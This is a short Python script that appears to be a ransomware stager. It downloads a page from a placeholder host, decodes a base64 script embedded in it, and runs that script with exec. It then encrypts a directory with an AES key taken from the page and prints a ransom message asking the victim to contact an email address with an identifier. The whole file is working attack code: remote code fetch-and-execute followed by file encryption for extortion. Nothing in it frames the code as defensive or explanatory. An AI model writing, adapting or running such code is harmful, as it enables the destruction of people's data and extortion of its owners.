#!/bin/python3

import requests
import base64
import time
from bs4 import BeautifulSoup

url = 'http://foo.com/'

if __name__ == "__main__":

    response = requests.get(url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        encoded_content = soup.find('pre').text.strip()
        key = soup.find("p", {"id": "key"}).text.strip()
        decoded_script = base64.b64decode(encoded_content).decode('utf-8')
        exec(decoded_script)
        AESencrypt_directory(key)
    else: 
        print(f"Failed to retrieve the page. Status code: {response.status_code}")

    victim_id = soup.find("p", {"id": "victim_id"}).text.strip()
    print("\nHello World!!!")
    print(f"\nYour valuable files are encrypted!!!\n\nContact foo@foo.com with identifier '{victim_id}' for assistance with decryption.\n")

